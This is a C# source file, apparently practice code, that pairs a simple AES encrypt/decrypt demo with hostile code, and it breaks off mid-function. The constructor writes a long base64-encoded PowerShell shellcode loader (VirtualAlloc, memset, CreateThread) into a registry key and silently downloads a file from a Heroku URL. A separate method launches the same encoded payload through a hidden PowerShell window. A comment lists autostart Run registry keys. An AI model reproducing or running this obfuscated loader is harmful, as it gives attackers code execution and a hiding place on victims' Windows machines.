﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

//powershell
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

using System.Net;


//decrypt
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;


namespace C_Sharp_Practice
{
    public class FileOperations
    {
        public FileOperations()
        {
            Console.WriteLine("FileOperations constructor");
            addRegistryEntry();

            //encryption and decryption
            Console.WriteLine("Please enter a password to use:");
            string password = Console.ReadLine();
            Console.WriteLine("Please enter a string to encrypt:");
            string plaintext = Console.ReadLine();
            Console.WriteLine("");

            Console.WriteLine("Your encrypted string is:");
            string encryptedstring = Encrypt(plaintext, password);
            Console.WriteLine(encryptedstring);
            Console.WriteLine("");

            Console.WriteLine("Your decrypted string is:");
            string decryptedstring = Decrypt(encryptedstring, password);
            Console.WriteLine(decryptedstring);
            Console.WriteLine("");
            

            //encode value
            Console.Write("Encode 'test' with base64: ");
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes("test");
            string value =  System.Convert.ToBase64String(plainTextBytes);
            Console.Write(value);

            // getShellWithPowerShell();
            using (WebClient client = new WebClient())
            {

                //client.Credentials


                client.DownloadFile("https://andy56-signup.herokuapp.com/robots.txt",
                                    @"c:\Users\Andy2014\h");

                
            }
        }

        private void getAddressFromHeroku()
        {
            var cli = new System.Net.WebClient();
            string data = cli.DownloadString("http://www.stackoverflow.com");

        }

        /*
        If your machine boots with annoying applications, check these registry locations
        [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
        [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce]
        [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]
        [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
        [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit]

        [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
        [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce]
        [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices]
        [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]
        [HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]
        */
        private void addRegistryEntry()
        {
            Microsoft.Win32.RegistryKey key;
            key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Names");
            key.SetValue("Name", "JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAZAA5ACwAMAB4AGMAZAAsADAAeABiAGEALAAwAHgANQA5ACwAMAB4ADYAZQAsADAAeAAxADQALAAwAHgAYwBkACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1ADgALAAwAHgAMwAzACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA1ADAALAAwAHgAMQA4ACwAMAB4ADgAMwAsADAAeABjADAALAAwAHgAMAA0ACwAMAB4ADAAMwAsADAAeAA1ADAALAAwAHgANABkACwAMAB4ADgAYwAsADAAeABlADEALAAwAHgAMwAxACwAMAB4ADgANQAsADAAeABkADIALAAwAHgAMABhACwAMAB4AGMAYQAsADAAeAA1ADUALAAwAHgAYgAzACwAMAB4ADgAMwAsADAAeAAyAGYALAAwAHgANgA0ACwAMAB4AGYAMwAsADAAeABmADAALAAwAHgAMgA0ACwAMAB4AGQANgAsADAAeABjADMALAAwAHgANwAzACwAMAB4ADYAOAAsADAAeABkAGEALAAwAHgAYQA4ACwAMAB4AGQANgAsADAAeAA5ADkALAAwAHgANgA5ACwAMAB4AGQAYwAsADAAeABmAGUALAAwAHgAYQBlACwAMAB4AGQAYQAsADAAeAA2AGIALAAwAHgAZAA5ACwAMAB4ADgAMQAsADAAeABkAGIALAAwAHgAYwAwACwAMAB4ADEAOQAsADAAeAA4ADMALAAwAHgANQBmACwAMAB4ADEAYgAsADAAeAA0AGUALAAwAHgANgAzACwAMAB4ADUAZQAsADAAeABkADQALAAwAHgAOAAzACwAMAB4ADYAMgAsADAAeABhADcALAAwAHgAMAA5ACwAMAB4ADYAOQAsADAAeAAzADYALAAwAHgANwAwACwAMAB4ADQANQAsADAAeABkAGMALAAwAHgAYQA3ACwAMAB4AGYANQAsADAAeAAxADMALAAwAHgAZABkACwAMAB4ADQAYwAsADAAeAA0ADUALAAwAHgAYgA1ACwAMAB4ADYANQAsADAAeABiADAALAAwAHgAMQBkACwAMAB4AGIANAAsADAAeAA0ADQALAAwAHgANgA3ACwAMAB4ADEANgAsADAAeABlAGYALAAwAHgANAA2ACwAMAB4ADgAOQAsADAAeABmAGIALAAwAHgAOQBiACwAMAB4AGMAZQAsADAAeAA5ADEALAAwAHgAMQA4ACwAMAB4AGEAMQAsADAAeAA5ADkALAAwAHgAMgBhACwAMAB4AGUAYQAsADAAeAA1AGQALAAwAHgAMQA4ACwAMAB4AGYAYgAsADAAeAAyADMALAAwAHgAOQBkACwAMAB4AGIANwAsADAAeABjADIALAAwAHgAOABjACwAMAB4ADYAYwAsADAAeABjADkALAAwAHgAMAAzACwAMAB4ADIAYQAsADAAeAA4AGYALAAwAHgAYgBjACwAMAB4ADcAZAAsADAAeAA0ADkALAAwAHgAMwAyACwAMAB4AGMANwAsADAAeABiADkALAAwAHgAMwAwACwAMAB4AGUAOAAsADAAeAA0ADIALAAwAHgANQBhACwAMAB4ADkAMgAsADAAeAA3AGIALAAwAHgAZgA0ACwAMAB4ADgANgAsADAAeAAyADMALAAwAHgAYQBmACwAMAB4ADYAMwAsADAAeAA0AGMALAAwAHgAMgBmACwAMAB4ADAANAAsADAAeABlADcALAAwAHgAMABhACwAMAB4ADMAMwAsADAAeAA5AGIALAAwAHgAMgA0ACwAMAB4ADIAMQAsADAAeAA0AGYALAAwAHgAMQAwACwAMAB4AGMAYgAsADAAeABlADYALAAwAHgAYwA2ACwAMAB4ADYAMgAsADAAeABlADgALAAwAHgAMgAyACwAMAB4ADgAMwAsADAAeAAzADEALAAwAHgAOQAxACwAMAB4ADcAMwAsADAAeAA2ADkALAAwAHgAOQA3ACwAMAB4AGEAZQAsADAAeAA2ADQALAAwAHgAZAAyACwAMAB4ADQAOAAsADAAeAAwAGIALAAwAHgAZQBlACwAMAB4AGYAZQAsADAAeAA5AGQALAAwAHgAMgA2ACwAMAB4AGEAZAAsADAAeAA5ADYALAAwAHgANQAyACwAMAB4ADAAYgAsADAAeAA0AGUALAAwAHgANgA2ACwAMAB4AGYAZAAsADAAeAAxAGMALAAwAHgAMwBkACwAMAB4ADUANAAsADAAeABhADIALAAwAHgAYgA2ACwAMAB4AGEAOQAsADAAeABkADQALAAwAHgAMgBiACwAMAB4ADEAMQAsADAAeAAyAGQALAAwAHgAMQBiACwAMAB4ADAANgAsADAAeABlADUALAAwAHgAYQAxACwAMAB4AGUAMgAsADAAeABhADkALAAwAHgAMQA2ACwAMAB4AGUAYgAsADAAeAAyADAALAAwAHgAZgBkACwAMAB4ADQANgAsADAAeAA4ADMALAAwAHgAOAAxACwAMAB4ADcAZQAsADAAeAAwAGQALAAwAHgANQAzACwAMAB4ADIAZQAsADAAeABhAGIALAAwAHgAYgA4ACwAMAB4ADUANgAsADAAeABiADgALAAwAHgAOQA0ACwAMAB4ADkANQAsADAAeAA1ADkALAAwAHgAMgA2ACwAMAB4ADcAZAAsADAAeABlADQALAAwAHgANQA5ACwAMAB4ADQAMAAsADAAeAA2ADUALAAwAHgANgAxACwAMAB4AGIAZgAsADAAeAAzAGMALAAwAHgAYwA1ACwAMAB4ADIAMQAsADAAeAAxADAALAAwAHgAZgBjACwAMAB4AGIANQAsADAAeAA4ADEALAAwAHgAYwAwACwAMAB4ADkANAAsADAAeABkAGYALAAwAHgAMABkACwAMAB4ADMAZQAsADAAeAA4ADQALAAwAHgAZABmACwAMAB4AGMANwAsADAAeAA1ADcALAAwAHgAMgBlACwAMAB4ADMAMAAsADAAeABiAGUALAAwAHgAMAAwACwAMAB4AGMANgAsADAAeABhADkALAAwAHgAOQBiACwAMAB4AGQAYgAsADAAeAA3ADcALAAwAHgAMwA1ACwAMAB4ADMANgAsADAAeABhADYALAAwAHgAYgA3ACwAMAB4AGIAZAAsADAAeABiADUALAAwAHgANQA2ACwAMAB4ADcAOQAsADAAeAAzADYALAAwAHgAYgAzACwAMAB4ADQANAAsADAAeABlAGQALAAwAHgAYgA2ACwAMAB4ADgAZQAsADAAeAAzADcALAAwAHgAYgBiACwAMAB4AGMAOQAsADAAeAAyADQALAAwAHgANQBkACwAMAB4ADQAMwAsADAAeAA1AGMALAAwAHgAYwAzACwAMAB4AGYANAAsADAAeAAxADQALAAwAHgAYwA4ACwAMAB4AGMAOQAsADAAeAAyADEALAAwAHgANQAyACwAMAB4ADUANwAsADAAeAAzADEALAAwAHgAMAA0ACwAMAB4AGUAOQAsADAAeAA1AGUALAAwAHgAYQA3ACwAMAB4AGUANwAsADAAeAA4ADUALAAwAHgAOQBlACwAMAB4ADIANwAsADAAeABlADgALAAwAHgANQA1ACwAMAB4AGMAOQAsADAAeAAyAGQALAAwAHgAZQA4ACwAMAB4ADMAZAAsADAAeABhAGQALAAwAHgAMQA1ACwAMAB4AGIAYgAsADAAeAA1ADgALAAwAHgAYgAyACwAMAB4ADgAMwAsADAAeABhAGYALAAwAHgAZgAxACwAMAB4ADIANwAsADAAeAAyAGMALAAwAHgAOAA2ACwAMAB4AGEANgAsADAAeABlADAALAAwAHgANAA0ACwAMAB4ADIANAAsADAAeAA5ADEALAAwAHgAYwA3ACwAMAB4AGMAYQAsADAAeABkADcALAAwAHgAZgA0ACwAMAB4AGQAOQAsADAAeAAzADcALAAwAHgAMABlACwAMAB4ADMAMAAsADAAeABhAGMALAAwAHgANQA5ACwAMAB4ADkAMgA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAeAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAJAAyACAAPQAgACIALQBlAG4AYwAgACIAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACAAJABlACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A");
            key.Close();
        }

        private void runPSremotely(string machineAddress)
        {
            WSManConnectionInfo connectionInfo = new WSManConnectionInfo();
            connectionInfo.ComputerName = machineAddress;
            Runspace runspace = RunspaceFactory.CreateRunspace(connectionInfo);
            runspace.Open();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                ps.AddScript("Get-Service");
                var results = ps.Invoke();
                // Do something with result ... 
            }
            runspace.Close();
        }

      
        private void changeBackground()
        {

        }

        //Start-Process notepad -WindowStyle Hidden
        //Get-Process notepad
        private void getShellWithPowerShell()
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "powershell.exe";
            startInfo.Arguments = "-window hidden -enc JAAxACAAPQAgACcAJABjACAAPQAgACcAJwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAdQBpAG4AdAAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAEEAbABsAG8AYwBhAHQAaQBvAG4AVAB5AHAAZQAsACAAdQBpAG4AdAAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFQAaAByAGUAYQBkACgASQBuAHQAUAB0AHIAIABsAHAAVABoAHIAZQBhAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwAsACAAdQBpAG4AdAAgAGQAdwBTAHQAYQBjAGsAUwBpAHoAZQAsACAASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQBlAHQAZQByACwAIAB1AGkAbgB0ACAAZAB3AEMAcgBlAGEAdABpAG8AbgBGAGwAYQBnAHMALAAgAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEkAZAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAdwAgAD0AIABBAGQAZAAtAFQAeQBwAGUAIAAtAG0AZQBtAGIAZQByAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAGMAIAAtAE4AYQBtAGUAIAAiAFcAaQBuADMAMgAiACAALQBuAGEAbQBlAHMAcABhAGMAZQAgAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvAG4AcwAgAC0AcABhAHMAcwB0AGgAcgB1ADsAWwBCAHkAdABlAFsAXQBdADsAWwBCAHkAdABlAFsAXQBdACQAegAgAD0AIAAwAHgAZAA5ACwAMAB4AGMAZAAsADAAeABiAGEALAAwAHgANQA5ACwAMAB4ADYAZQAsADAAeAAxADQALAAwAHgAYwBkACwAMAB4AGQAOQAsADAAeAA3ADQALAAwAHgAMgA0ACwAMAB4AGYANAAsADAAeAA1ADgALAAwAHgAMwAzACwAMAB4AGMAOQAsADAAeABiADEALAAwAHgANAA3ACwAMAB4ADMAMQAsADAAeAA1ADAALAAwAHgAMQA4ACwAMAB4ADgAMwAsADAAeABjADAALAAwAHgAMAA0ACwAMAB4ADAAMwAsADAAeAA1ADAALAAwAHgANABkACwAMAB4ADgAYwAsADAAeABlADEALAAwAHgAMwAxACwAMAB4ADgANQAsADAAeABkADIALAAwAHgAMABhACwAMAB4AGMAYQAsADAAeAA1ADUALAAwAHgAYgAzACwAMAB4ADgAMwAsADAAeAAyAGYALAAwAHgANgA0ACwAMAB4AGYAMwAsADAAeABmADAALAAwAHgAMgA0ACwAMAB4AGQANgAsADAAeABjADMALAAwAHgANwAzACwAMAB4ADYAOAAsADAAeABkAGEALAAwAHgAYQA4ACwAMAB4AGQANgAsADAAeAA5ADkALAAwAHgANgA5ACwAMAB4AGQAYwAsADAAeABmAGUALAAwAHgAYQBlACwAMAB4AGQAYQAsADAAeAA2AGIALAAwAHgAZAA5ACwAMAB4ADgAMQAsADAAeABkAGIALAAwAHgAYwAwACwAMAB4ADEAOQAsADAAeAA4ADMALAAwAHgANQBmACwAMAB4ADEAYgAsADAAeAA0AGUALAAwAHgANgAzACwAMAB4ADUAZQAsADAAeABkADQALAAwAHgAOAAzACwAMAB4ADYAMgAsADAAeABhADcALAAwAHgAMAA5ACwAMAB4ADYAOQAsADAAeAAzADYALAAwAHgANwAwACwAMAB4ADQANQAsADAAeABkAGMALAAwAHgAYQA3ACwAMAB4AGYANQAsADAAeAAxADMALAAwAHgAZABkACwAMAB4ADQAYwAsADAAeAA0ADUALAAwAHgAYgA1ACwAMAB4ADYANQAsADAAeABiADAALAAwAHgAMQBkACwAMAB4AGIANAAsADAAeAA0ADQALAAwAHgANgA3ACwAMAB4ADEANgAsADAAeABlAGYALAAwAHgANAA2ACwAMAB4ADgAOQAsADAAeABmAGIALAAwAHgAOQBiACwAMAB4AGMAZQAsADAAeAA5ADEALAAwAHgAMQA4ACwAMAB4AGEAMQAsADAAeAA5ADkALAAwAHgAMgBhACwAMAB4AGUAYQAsADAAeAA1AGQALAAwAHgAMQA4ACwAMAB4AGYAYgAsADAAeAAyADMALAAwAHgAOQBkACwAMAB4AGIANwAsADAAeABjADIALAAwAHgAOABjACwAMAB4ADYAYwAsADAAeABjADkALAAwAHgAMAAzACwAMAB4ADIAYQAsADAAeAA4AGYALAAwAHgAYgBjACwAMAB4ADcAZAAsADAAeAA0ADkALAAwAHgAMwAyACwAMAB4AGMANwAsADAAeABiADkALAAwAHgAMwAwACwAMAB4AGUAOAAsADAAeAA0ADIALAAwAHgANQBhACwAMAB4ADkAMgAsADAAeAA3AGIALAAwAHgAZgA0ACwAMAB4ADgANgAsADAAeAAyADMALAAwAHgAYQBmACwAMAB4ADYAMwAsADAAeAA0AGMALAAwAHgAMgBmACwAMAB4ADAANAAsADAAeABlADcALAAwAHgAMABhACwAMAB4ADMAMwAsADAAeAA5AGIALAAwAHgAMgA0ACwAMAB4ADIAMQAsADAAeAA0AGYALAAwAHgAMQAwACwAMAB4AGMAYgAsADAAeABlADYALAAwAHgAYwA2ACwAMAB4ADYAMgAsADAAeABlADgALAAwAHgAMgAyACwAMAB4ADgAMwAsADAAeAAzADEALAAwAHgAOQAxACwAMAB4ADcAMwAsADAAeAA2ADkALAAwAHgAOQA3ACwAMAB4AGEAZQAsADAAeAA2ADQALAAwAHgAZAAyACwAMAB4ADQAOAAsADAAeAAwAGIALAAwAHgAZQBlACwAMAB4AGYAZQAsADAAeAA5AGQALAAwAHgAMgA2ACwAMAB4AGEAZAAsADAAeAA5ADYALAAwAHgANQAyACwAMAB4ADAAYgAsADAAeAA0AGUALAAwAHgANgA2ACwAMAB4AGYAZAAsADAAeAAxAGMALAAwAHgAMwBkACwAMAB4ADUANAAsADAAeABhADIALAAwAHgAYgA2ACwAMAB4AGEAOQAsADAAeABkADQALAAwAHgAMgBiACwAMAB4ADEAMQAsADAAeAAyAGQALAAwAHgAMQBiACwAMAB4ADAANgAsADAAeABlADUALAAwAHgAYQAxACwAMAB4AGUAMgAsADAAeABhADkALAAwAHgAMQA2ACwAMAB4AGUAYgAsADAAeAAyADAALAAwAHgAZgBkACwAMAB4ADQANgAsADAAeAA4ADMALAAwAHgAOAAxACwAMAB4ADcAZQAsADAAeAAwAGQALAAwAHgANQAzACwAMAB4ADIAZQAsADAAeABhAGIALAAwAHgAYgA4ACwAMAB4ADUANgAsADAAeABiADgALAAwAHgAOQA0ACwAMAB4ADkANQAsADAAeAA1ADkALAAwAHgAMgA2ACwAMAB4ADcAZAAsADAAeABlADQALAAwAHgANQA5ACwAMAB4ADQAMAAsADAAeAA2ADUALAAwAHgANgAxACwAMAB4AGIAZgAsADAAeAAzAGMALAAwAHgAYwA1ACwAMAB4ADIAMQAsADAAeAAxADAALAAwAHgAZgBjACwAMAB4AGIANQAsADAAeAA4ADEALAAwAHgAYwAwACwAMAB4ADkANAAsADAAeABkAGYALAAwAHgAMABkACwAMAB4ADMAZQAsADAAeAA4ADQALAAwAHgAZABmACwAMAB4AGMANwAsADAAeAA1ADcALAAwAHgAMgBlACwAMAB4ADMAMAAsADAAeABiAGUALAAwAHgAMAAwACwAMAB4AGMANgAsADAAeABhADkALAAwAHgAOQBiACwAMAB4AGQAYgAsADAAeAA3ADcALAAwAHgAMwA1ACwAMAB4ADMANgAsADAAeABhADYALAAwAHgAYgA3ACwAMAB4AGIAZAAsADAAeABiADUALAAwAHgANQA2ACwAMAB4ADcAOQAsADAAeAAzADYALAAwAHgAYgAzACwAMAB4ADQANAAsADAAeABlAGQALAAwAHgAYgA2ACwAMAB4ADgAZQAsADAAeAAzADcALAAwAHgAYgBiACwAMAB4AGMAOQAsADAAeAAyADQALAAwAHgANQBkACwAMAB4ADQAMwAsADAAeAA1AGMALAAwAHgAYwAzACwAMAB4AGYANAAsADAAeAAxADQALAAwAHgAYwA4ACwAMAB4AGMAOQAsADAAeAAyADEALAAwAHgANQAyACwAMAB4ADUANwAsADAAeAAzADEALAAwAHgAMAA0ACwAMAB4AGUAOQAsADAAeAA1AGUALAAwAHgAYQA3ACwAMAB4AGUANwAsADAAeAA4ADUALAAwAHgAOQBlACwAMAB4ADIANwAsADAAeABlADgALAAwAHgANQA1ACwAMAB4AGMAOQAsADAAeAAyAGQALAAwAHgAZQA4ACwAMAB4ADMAZAAsADAAeABhAGQALAAwAHgAMQA1ACwAMAB4AGIAYgAsADAAeAA1ADgALAAwAHgAYgAyACwAMAB4ADgAMwAsADAAeABhAGYALAAwAHgAZgAxACwAMAB4ADIANwAsADAAeAAyAGMALAAwAHgAOAA2ACwAMAB4AGEANgAsADAAeABlADAALAAwAHgANAA0ACwAMAB4ADIANAAsADAAeAA5ADEALAAwAHgAYwA3ACwAMAB4AGMAYQAsADAAeABkADcALAAwAHgAZgA0ACwAMAB4AGQAOQAsADAAeAAzADcALAAwAHgAMABlACwAMAB4ADMAMAAsADAAeABhAGMALAAwAHgANQA5ACwAMAB4ADkAMgA7ACQAZwAgAD0AIAAwAHgAMQAwADAAMAA7AGkAZgAgACgAJAB6AC4ATABlAG4AZwB0AGgAIAAtAGcAdAAgADAAeAAxADAAMAAwACkAewAkAGcAIAA9ACAAJAB6AC4ATABlAG4AZwB0AGgAfQA7ACQAeAA9ACQAdwA6ADoAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAAwACwAMAB4ADEAMAAwADAALAAkAGcALAAwAHgANAAwACkAOwBmAG8AcgAgACgAJABpAD0AMAA7ACQAaQAgAC0AbABlACAAKAAkAHoALgBMAGUAbgBnAHQAaAAtADEAKQA7ACQAaQArACsAKQAgAHsAJAB3ADoAOgBtAGUAbQBzAGUAdAAoAFsASQBuAHQAUAB0AHIAXQAoACQAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABpACkALAAgACQAegBbACQAaQBdACwAIAAxACkAfQA7ACQAdwA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKAAwACwAMAAsACQAeAAsADAALAAwACwAMAApADsAZgBvAHIAIAAoADsAOwApAHsAUwB0AGEAcgB0AC0AcwBsAGUAZQBwACAANgAwAH0AOwAnADsAJABlACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkADEAKQApADsAJAAyACAAPQAgACIALQBlAG4AYwAgACIAOwBpAGYAKABbAEkAbgB0AFAAdAByAF0AOgA6AFMAaQB6AGUAIAAtAGUAcQAgADgAKQB7ACQAMwAgAD0AIAAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAAgACsAIAAiAFwAcwB5AHMAdwBvAHcANgA0AFwAVwBpAG4AZABvAHcAcwBQAG8AdwBlAHIAUwBoAGUAbABsAFwAdgAxAC4AMABcAHAAbwB3AGUAcgBzAGgAZQBsAGwAIgA7AGkAZQB4ACAAIgAmACAAJAAzACAAJAAyACAAJABlACIAfQBlAGwAcwBlAHsAOwBpAGUAeAAgACIAJgAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAkADIAIAAkAGUAIgA7AH0A";
            process.StartInfo = startInfo;
            process.Start();
        }

        private static readonly byte[] initVectorBytes = Encoding.ASCII.GetBytes("tu89geji340t89u2");

        // This constant is used to determine the keysize of the encryption algorithm.
        private const int keysize = 256;

        public static string Encrypt(string plainText, string passPhrase)
        {
            byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            using (PasswordDeriveBytes password = new PasswordDeriveBytes(passPhrase, null))
            {
                byte[] keyBytes = password.GetBytes(keysize / 8);
                using (RijndaelManaged symmetricKey = new RijndaelManaged())
                {
                    symmetricKey.Mode = CipherMode.CBC;
                    using (ICryptoTransform encryptor = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes))
                    {
                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                            using (CryptoStream cryptoStream = new CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write))
                            {
                                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);
                                cryptoStream.FlushFinalBlock();
                                byte[] cipherTextBytes = memoryStream.ToArray();
                                return Convert.ToBase64String(cipherTextBytes);
                            }
                        }
                    }
                }
            }
        }

        public static string Decrypt(string cipherText, string passPhrase)
        {
            byte[] cipherTextBytes = Convert.FromBase64String(cipherText);
            using (PasswordDeriveBytes password = new PasswordDeriveBytes(passPhrase, null))
            {
